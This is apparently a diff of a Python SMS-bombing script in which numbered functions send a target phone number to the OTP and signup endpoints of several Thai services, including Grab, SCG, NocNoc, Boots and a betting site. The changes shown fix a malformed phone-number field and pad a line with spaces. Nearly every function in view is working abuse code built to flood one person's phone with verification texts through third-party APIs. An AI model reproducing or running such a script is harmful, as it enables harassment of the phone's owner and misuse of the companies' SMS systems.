@@ -40,6 +40,7 @@ def ab11(phone):
 def ab12(phone):
     requests.post("https://partner-api.grab.com/grabid/v1/oauth2/otp", headers={"User-Agent": "Mozilla/5.0"}, json={"client_id": "4ddf78ade8324462988fec5bfc5874c2", "transaction_ctx": "null", "country_code": "TH", "method": "SMS", "num_digits": "6", "scope": "openid profile.read foodweb.order foodweb.rewards foodweb.get_enterprise_profile", "phone_number": f"{phone[1:]}"})
 
+
 def ab13(phone):
     requests.post("https://api.scg-id.com/api/otp/send_otp", headers={"User-Agent": "Mozilla/5.0", "Content-Type": "application/json;charset=UTF-8"}, json={"phone_no": phone})
 
@@ -65,7 +66,7 @@ def ab19(phone):
     requests.post("https://nocnoc.com/authentication-service/user/OTP?b-uid=1.0.661", headers={"User-Agent": "Mozilla/5.0"}, json={"lang": "th", "userType": "BUYER", "locale": "th", "orgIdfier": "scg", "phone": f"{phone[1:]}", "type": "signup", "otpTemplate": "buyer_signup_otp_message", "userParams": {"buyerName": randomString(10)}})
 
 def ab20(phone):
-    requests.post("https://store.boots.co.th/api/v1/guest/register/otp", headers={"User-Agent": "Mozilla/5.0"}, json={"phone_number": f"{phone[1:]}}"})
+    requests.post("https://store.boots.co.th/api/v1/guest/register/otp", headers={"User-Agent": "Mozilla/5.0"}, json={"phone_number": f"{phone[1:]}"})
 
 def ab21(phone):
     requests.post("https://m.lucabet168.com/api/register-otp", headers={"User-Agent": "Mozilla/5.0"}, json={"brands_id": "609caede5a67e5001164b89d", "agent_register": "60a22f7d233d2900110070d7", "tel": phone})
@@ -259,4 +260,4 @@ def main():
 
 if __name__ == '__main__':
     main()
-                  
+                                                                                                                                      
